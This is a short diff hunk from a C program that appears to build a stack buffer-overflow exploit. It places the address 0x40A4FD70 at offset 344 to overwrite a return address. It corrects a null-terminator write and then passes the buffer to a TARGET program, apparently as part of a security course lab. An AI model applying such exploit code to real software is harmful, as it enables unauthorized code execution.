@@ -32,7 +32,7 @@ main ( int argc, char * argv[] )
 
     uint64_t *return_address = (uint64_t *) &input[344];
     *return_address = 0x40A4FD70;
-    return_address[362] = 0x0;
+    input[352] = 0x0;
 
     args[0] = TARGET;
     args[1] = (char *) input;
